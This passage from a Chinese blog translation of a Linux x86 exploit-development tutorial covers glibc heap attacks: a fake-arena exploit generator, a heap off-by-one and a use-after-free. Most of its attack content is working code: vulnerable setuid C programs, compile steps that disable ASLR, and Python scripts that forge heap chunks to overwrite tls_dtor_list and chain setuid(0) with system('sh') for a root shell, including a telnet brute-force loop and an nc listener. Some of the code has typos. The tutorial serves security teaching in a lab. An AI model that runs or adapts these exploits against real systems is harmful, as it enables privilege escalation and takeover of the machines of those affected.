   fwrite(scode, **<span class="keyword">sizeof</span>**(scode)<span class="number">-1</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* SHELLCODE */</span>                           <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">230</span>;j++)  </span><br><span class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span>                          <span class="keyword">continue</span>;  </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* prev_size */</span>  </span><br><span class="line">                        fwrite(<span class="string">"\x09\x04\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* size */</span>  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">720</span>) &#123;  </span><br><span class="line">                       <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">90</span>;j++)  </span><br><span class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span>                           fwrite(<span class="string">"\x18\xa0\x04\x08"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* Arena Pointer */</span>                          <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">165</span>;j++)  </span><br><span class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span>  </span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;  </span><br><span class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">256</span>;j++)  </span><br><span class="line">                                fwrite(<span class="string">"\x42\x42\x42\x42"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="built_in">stdout</span>); <span class="comment">/* PAD */</span> </span><br><span class="line">                &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在攻击者生成数据作为用户输入之后，<code>glibc malloc</code> 执行下列事情，当漏洞程序的行[4]执行时：</p>
<p>   <strong>Step 1</strong>：正在释放的<code>堆的 arena</code> 由访问<code>arena_for_chunk</code>获取。</p>
<p>   <strong>Step 2</strong>：使用 <code>arena 指针</code>和<code>块地址</code>作为参数调用<code>_int_free</code>。我们这里，<code>arena 指针</code>指向了<code>伪造的 arena。因此伪造的 arena</code> 和<code>块地址</code>作为参数传递给了<code>_int_free</code>。</p>
<p>   <strong>Step 3</strong>：如果块不是 <code>mmap</code>分配的，要获取锁。我们这里块不是<code>mmap</code>配的，<code>伪造的 arena</code>的互斥锁获取成功。</p>
<p>   <strong>Step 4</strong>：合并： 查看上一个块是否空闲，如果空闲则合并。我们这里上一个块已分配，所以不能向后合并。查看下一个块是否空闲，如果空闲则合并。我们这里下一个块已分配，所以不能合并。</p>
<p>   <strong>Step 5</strong>：将当前空闲块放进 <code>unsorted bin</code>中。</p>
<p>使用攻击者生成的数据文件，作为用户输入执行漏洞程序会执行<code>shellcode</code>，像这样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">szt@ubuntu:~/linux exploit/test10$ $gcc -g -z norelro -z execstack -o test test.c -Wl,--rpath=/home/szt/glibc/glibc-inst2<span class="number">.20</span>/lib -Wl,--dynamic-linker=/home/szt/glibc/glibc-inst2<span class="number">.20</span>/lib/ld-linux.so<span class="number">.2</span>  </span><br><span class="line">szt@ubuntu:~/linux exploit/test10$ gcc -g -o <span class="built_in">exp</span> <span class="built_in">exp</span>.c  </span><br><span class="line">szt@ubuntu:~/linux exploit/test10$ ./<span class="built_in">exp</span> &gt; file  </span><br><span class="line">szt@ubuntu:~/linux exploit/test10$ ./test &lt; file  </span><br><span class="line">ptr found at <span class="number">0x8048380</span>  </span><br><span class="line">good heap allignment found on <span class="built_in">malloc</span>() <span class="number">724</span> (<span class="number">0x80483a0</span>)</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="Off-By-One-漏洞（基于堆）"><a href="#Off-By-One-漏洞（基于堆）" class="headerlink" title="Off-By-One 漏洞（基于堆）"></a>Off-By-One 漏洞（基于堆）</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p>
<p>将源字符串复制到目标缓冲区可能造成 <code>Off-By-One</code> 漏洞，当源字符串的长度等于目标缓冲区长度的时候。当源字符串的长度等于目标缓冲区长度的时候，单个 <code>NULL 字符</code>会复制到目标缓冲区的上方。因此由于目标缓冲区位于堆上，<code>单个 NULL 字节</code>会覆盖下一个块的块头部，并且这会导致任意代码执行。</p>
<p><strong>漏洞代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//consolidate_forward.c  </span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;      </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> SIZE 16     </span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"> <span class="keyword">int</span> fd = open(<span class="string">"./inp_file"</span>, O_RDONLY); <span class="comment">/* [1] */</span>  </span><br><span class="line"> <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;  </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"File open error\n"</span>);  </span><br><span class="line"> fflush(<span class="built_in">stdout</span>);  </span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">-1</span>);  </span><br><span class="line"> &#125;     </span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">1020</span>) &#123; <span class="comment">/* [2] */</span>  </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Buffer Overflow Attempt. Exiting...\n"</span>);  </span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">-2</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">    <span class="keyword">char</span>* tmp = <span class="built_in">malloc</span>(<span class="number">20</span><span class="number">-4</span>); <span class="comment">/* [3] */</span>  </span><br><span class="line">    <span class="keyword">char</span>* p = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [4] */</span>  </span><br><span class="line">    <span class="keyword">char</span>* p2 = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [5] */</span>  </span><br><span class="line">    <span class="keyword">char</span>* p3 = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [6] */</span>     </span><br><span class="line">    read(fd,tmp,SIZE); <span class="comment">/* [7] */</span>  </span><br><span class="line">    <span class="built_in">strcpy</span>(p2,argv[<span class="number">1</span>]); <span class="comment">/* [8] */</span>     </span><br><span class="line">    <span class="built_in">free</span>(p); <span class="comment">/* [9] */</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译命令：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -o consolidate_forward consolidate_forward.c  </span><br><span class="line">$sudo chown root consolidate_forward  </span><br><span class="line">$sudo chgrp root consolidate_forward  </span><br><span class="line">$sudo chmod +s consolidate_forward</span><br></pre></td></tr></table></figure>

<p>上述漏洞代码的行[2]和[8]是基于<code>堆</code>的 <code>off-by-one</code> 溢出发生的地方。<code>目标缓冲区</code>的长度是 <code>1020</code>，因此长度为 1020 的源字符串可能导致任意代码执行。</p>
<p><code>unlink</code>一个已经处于分配状态的块，会导致任意代码执行，因为任何四个字节的内存区域都能被攻击者的数据覆盖。但是在同一篇文章中，我们也看到，<code>unlink</code> 技巧已经废弃，因为 <code>glibc</code> 近几年来变得更加可靠。具体来说，因为<code>双向链表损坏</code>的条件，任意代码执行时不可能的。但是，Google 的 Project Zero 小组找到了一种方式，来成功绕过<code>双向链表损坏</code>的条件，通过 <code>unlink large</code> 块。</p>
<p>在 <code>glibc malloc</code> 中，主要的<code>环形双向链表</code>由<code>malloc_chunk</code>的<code>fd</code>和<code>bk</code>字段维护，而次要的<code>环形双向链表</code>由<code>malloc_chunk</code>的<code>fd_nextsize</code>和<code>bk_nextsize</code>字段维护。双向链表的加固看起来用在主要（行[1]）和次要（行[4]和[5]）的双向链表上，但是次要的环形双向链表的加固，只是个调试断言语句（不像主要双向链表加固那样，是运行时检查），它在<code>生产构建中没有被编译</code>（至少在 <code>fedora x86</code>中）。因此，次要的环形双向链表的加固（行[4]和[5]）并不重要，这让我们能够向<code>任意 4 个字节的内存区域</code>写入任何数据。所以现在攻击者需要覆盖要被释放的 <code>large 块的malloc_chunk元素</code>。</p>
<p><strong>利用代码：</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp_try.py  </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line">fd = <span class="number">0xb7ff9712</span>  </span><br><span class="line">bk = <span class="number">0xb7f861b4</span>  </span><br><span class="line">fd_nextsize = <span class="number">0xb7f86157</span>  </span><br><span class="line">bk_nextsize = <span class="number">0x804b430</span>  </span><br><span class="line">system = <span class="number">0xb7e5d0b0</span>  </span><br><span class="line">sh = <span class="number">0xb7f816a0</span>  </span><br><span class="line">     <span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">     <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  </span><br><span class="line">buf = conv(fd)  </span><br><span class="line">buf += conv(bk)  </span><br><span class="line">buf += conv(fd_nextsize)  </span><br><span class="line">buf += conv(bk_nextsize)  </span><br><span class="line">buf += conv(system)  </span><br><span class="line">buf += conv(sh)  </span><br><span class="line">buf += <span class="string">"A"</span> * <span class="number">996</span>     </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./consolidate_forward"</span>, buf])</span><br></pre></td></tr></table></figure>

<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu25.png" title="图25">

<p>执行上述利用代码不会向我们提供 <code>root shell</code>。它向我们提供了一个运行在我们的权限级别的 <code>bash shell</code></p>
<p>当<code>uid != euid</code>时，<code>/bin/bash</code>会丢弃权限。我们的二进制<code>前向合并</code>的真实<code>uid 是 1000</code>，但是它的<code>有效 uid</code>是 0。因此当<code>system调用</code>时，<code>bash 会丢弃权限</code>，因为<code>真实 uid</code>不等于<code>有效 uid</code>。为了解决这个问题，我们需要在s<code>ystem之前调用setuid(0)</code>，因为<code>_call_tls_dtors()</code>依次遍历<code>tls_dtor_list</code>，我们需要将<code>setuid</code>和<code>system</code>链接，以便获得<code>root shell</code>。</p>
<p><strong>完整利用代码：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gen_file.py  </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"><span class="comment">#dtor_list  </span></span><br><span class="line">setuid = <span class="number">0x4e123e30</span>  </span><br><span class="line">setuid_arg = <span class="number">0x0</span>  </span><br><span class="line">mp = <span class="number">0x804b020</span>  </span><br><span class="line">nxt = <span class="number">0x804b430</span>  </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">      <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  </span><br><span class="line">tst = conv(setuid)  </span><br><span class="line">tst += conv(setuid_arg)  </span><br><span class="line">tst += conv(mp)  </span><br><span class="line">tst += conv(nxt)  </span><br><span class="line"><span class="keyword">print</span> tst</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py  </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line">fd = <span class="number">0x0804b418</span>  </span><br><span class="line">bk = <span class="number">0x0804b418</span>  </span><br><span class="line">fd_nextsize = <span class="number">0xb7fe86c0</span>  </span><br><span class="line">bk_nextsize = <span class="number">0x804b008</span>  </span><br><span class="line">system = <span class="number">0x4e0a86e0</span>  </span><br><span class="line">sh = <span class="number">0x80482ce</span>     </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">     <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  </span><br><span class="line">buf = conv(fd)  </span><br><span class="line">buf += conv(fd_nextsize)  </span><br><span class="line">buf += conv(bk_nextsize)  </span><br><span class="line">buf += conv(system)  </span><br><span class="line">buf += conv(sh)  </span><br><span class="line">buf += <span class="string">"A"</span> * <span class="number">996</span>  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./consolidate_forward"</span>, buf])</span><br></pre></td></tr></table></figure>

<p>执行上述利用代码会给我们 <code>root shell</code></p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu26.png" title="图26">

<hr>
<h2 id="释放后使用"><a href="#释放后使用" class="headerlink" title="释放后使用"></a>释放后使用</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p>
<p>继续使用已经<code>被释放的堆内存指针</code>叫做<code>释放后使用</code>。这个漏洞会导致任意代码执行。</p>
<p><strong>漏洞代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;  </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> BUFSIZE1 1020  </span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> BUFSIZE2 ((BUFSIZE1/2) - 4)      </span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> argv)</span> </span>&#123;      </span><br><span class="line"> <span class="keyword">char</span>* name = <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">/* [1] */</span>  </span><br><span class="line"> <span class="keyword">char</span>* details = <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">/* [2] */</span>  </span><br><span class="line"> <span class="built_in">strncpy</span>(name, argv[<span class="number">1</span>], <span class="number">12</span><span class="number">-1</span>); <span class="comment">/* [3] */</span>  </span><br><span class="line"> <span class="built_in">free</span>(details); <span class="comment">/* [4] */</span>  </span><br><span class="line"> <span class="built_in">free</span>(name);  <span class="comment">/* [5] */</span>  </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Welcome %s\n"</span>,name); <span class="comment">/* [6] */</span>  </span><br><span class="line"> fflush(<span class="built_in">stdout</span>);     </span><br><span class="line"> <span class="keyword">char</span>* tmp = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="number">12</span>); <span class="comment">/* [7] */</span>  </span><br><span class="line"> <span class="keyword">char</span>* p1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE1); <span class="comment">/* [8] */</span>  </span><br><span class="line"> <span class="keyword">char</span>* p2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE1); <span class="comment">/* [9] */</span>  </span><br><span class="line"> <span class="built_in">free</span>(p2); <span class="comment">/* [10] */</span>  </span><br><span class="line"> <span class="keyword">char</span>* p2_1 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); <span class="comment">/* [11] */</span>  </span><br><span class="line"> <span class="keyword">char</span>* p2_2 = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(BUFSIZE2); <span class="comment">/* [12] */</span>     </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Enter your region\n"</span>);  </span><br><span class="line"> fflush(<span class="built_in">stdout</span>);  </span><br><span class="line"> read(<span class="number">0</span>,p2,BUFSIZE1<span class="number">-1</span>); <span class="comment">/* [13] */</span>  </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"Region:%s\n"</span>,p2);   </span><br><span class="line"> <span class="built_in">free</span>(p1); <span class="comment">/* [14] */</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译命令：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure>

<p>不像上一篇文章，<code>ASLR</code> 在这里是打开的。所以现在让我们利用 <code>UAF 漏洞</code>，因为 <code>ASLR</code>打开了，让我们使用信息泄露和爆破技巧来绕过它。上面的漏洞代码包含<code>两个 UAF 漏洞</code>，位于行[6]和[13]。它们的堆内存在行[5]和[10]释放，但是它们的指针即使在释放后也使用，在行[6]和[13]。行[6]的<code>UAF</code> 会导致信息泄露，而行[13]的 <code>UAF</code> 导致任意代码执行。</p>
<blockquote>
<p>• 行[1]为<code>name</code>分配了 16 字节的堆内存区域。</p>
<p>• 行[2]位<code>details</code>分配了 16 字节的堆内存区域。</p>
<p>• 行[3]将程序的参数<code>1（argv[1]）</code>复制到堆内存区域<code>name</code>中。</p>
<p>• 行[4]和[5]将堆内存区域<code>name</code>和<code>details</code>释放给 <code>glibc malloc</code>。</p>
<p>• 行[6]的<code>printf</code>在释放后使用<code>name指针</code>，这会导致堆地址的泄露。</p>
<p>• 行[7]为<code>tmp</code>分配了 16 字节的堆内存区域。</p>
<p>• 行[8]为<code>p1</code>分配了 1024 字节的堆内存区域。</p>
<p>• 行[9]为<code>p2</code>分配了 1024 字节的堆内存区域。</p>
<p>• 行[10]将堆内存区域<code>p2</code>释放给 <code>glibc malloc</code>。</p>
<p>• 行[11]为<code>p2_1</code>分配了 512 字节的堆内存区域。</p>
<p>• 行[12]为<code>p2_2</code>分配了 512 字节的堆内存区域。</p>
<p>• 行[13]的读取在释放后使用了<code>p2</code>指针。</p>
<p>• 行[14]将堆内存区域<code>p1</code>释放给 <code>glibc malloc</code>。这会在程序退出时导致任意代码执行。</p>
</blockquote>
<p><strong>利用代码：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp.py  </span></span><br><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="keyword">import</span> struct* </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> telnetlib  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">ip = <span class="string">'127.0.0.1'</span>  </span><br><span class="line">port = <span class="number">1234</span>  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(data)</span>:</span>  </span><br><span class="line"><span class="keyword">global</span> con  </span><br><span class="line">con.write(data)  </span><br><span class="line"><span class="keyword">return</span> con.read_until(<span class="string">'\n'</span>)  </span><br><span class="line"><span class="keyword">print</span> <span class="string">" Bruteforcing libc base address"</span>  </span><br><span class="line">libc_base_addr = <span class="number">0xb756a000</span>  </span><br><span class="line">fd_nextsize = (libc_base_addr - <span class="number">0x1000</span>) + <span class="number">0x6c0</span>  </span><br><span class="line">system = libc_base_addr + <span class="number">0x3e6e0</span>  </span><br><span class="line">system_arg = <span class="number">0x80482ae</span>  </span><br><span class="line">size = <span class="number">0x200</span>  </span><br><span class="line">setuid = libc_base_addr + <span class="number">0xb9e30</span>  </span><br><span class="line">setuid_arg = <span class="number">0x0</span>  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">  time.sleep(<span class="number">4</span>)  </span><br><span class="line">  con = telnetlib.Telnet(ip, port)  </span><br><span class="line">  laddress = con.read_until(<span class="string">'\n'</span>)  </span><br><span class="line">  laddress = laddress[<span class="number">8</span>:<span class="number">12</span>]  </span><br><span class="line">  heap_addr_tup = truct.unpack(<span class="string">"&lt;I"</span>, laddress)  </span><br><span class="line">  heap_addr = heap_addr_tup[<span class="number">0</span>]  </span><br><span class="line">  <span class="keyword">print</span> <span class="string">" Leaked heap addresses : [0x%x] "</span> %(heap_addr)  </span><br><span class="line">  heap_base_addr = heap_addr - <span class="number">0x10</span>  </span><br><span class="line">  fd = heap_base_addr + <span class="number">0x410</span>  </span><br><span class="line">  bk = fd  </span><br><span class="line">  bk_nextsize = heap_base_addr + <span class="number">0x618</span>  </span><br><span class="line">  mp = heap_base_addr + <span class="number">0x18</span>  </span><br><span class="line">  nxt = heap_base_addr + <span class="number">0x428</span>  </span><br><span class="line">  <span class="keyword">print</span> <span class="string">" Constructing fake chunk to overwrite tls_dtor_list"</span>  </span><br><span class="line">  fake_chunk = conv(fd)  </span><br><span class="line">  fake_chunk += conv(bk)  </span><br><span class="line">  fake_chunk += conv(fd_nextsize)  </span><br><span class="line">  fake_chunk += conv(bk_nextsize)  </span><br><span class="line">  fake_chunk += conv(system)  </span><br><span class="line">  fake_chunk += conv(system_arg)  </span><br><span class="line">  fake_chunk += <span class="string">"A"</span> * <span class="number">484</span>  </span><br><span class="line">  fake_chunk += conv(size)  </span><br><span class="line">  fake_chunk += conv(setuid)  </span><br><span class="line">  fake_chunk += conv(setuid_arg)  </span><br><span class="line">  fake_chunk += conv(mp)  </span><br><span class="line">  fake_chunk += conv(nxt)  </span><br><span class="line">  <span class="keyword">print</span> <span class="string">" Successful tls_dtor_list overwrite gives us shell!!"</span>  </span><br><span class="line">  send(fake_chunk)  </span><br><span class="line">  <span class="keyword">try</span>:   </span><br><span class="line">    con.interact()  </span><br><span class="line">    <span class="keyword">except</span>:   </span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>由于在爆破技巧中，我们需要<code>尝试多次</code>（直到成功）。让我们将我们的漏洞二进制<code>test</code>运行为网络服务器，并使用 <code>Shell</code> 教程来确保崩溃时自动重启：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#test.sh  </span></span><br><span class="line">#!/bin/sh  </span><br><span class="line">nc_process_id=$(pidof nc)  </span><br><span class="line"><span class="keyword">while</span> :  </span><br><span class="line"><span class="keyword">do</span>  </span><br><span class="line"> <span class="keyword">if</span> [[ -z $nc_process_id ]]; then  </span><br><span class="line">    echo <span class="string">"(Re)starting nc..."</span>  </span><br><span class="line">    nc -l -p <span class="number">1234</span> -c <span class="string">"./test sploitfun"</span>  </span><br><span class="line"> <span class="keyword">else</span> </span><br><span class="line">    echo <span class="string">"nc is running..."</span>  </span><br><span class="line">    fi  </span><br><span class="line">    done</span><br></pre></td></tr></table></figure>

<p>但是运行并不成功，后来查询资料。发现是已经加强了防护。使得这种更难攻击成功。</p>

      
    </div>

    

    
      
    

<div>
      
          <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">
              -------------本文结束<i class="fa fa-cog fa-spin"></i>感谢您的阅读-------------
        </div>
    
</div>
      
</div>

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      
        
          
        
        <div class="post-tags">
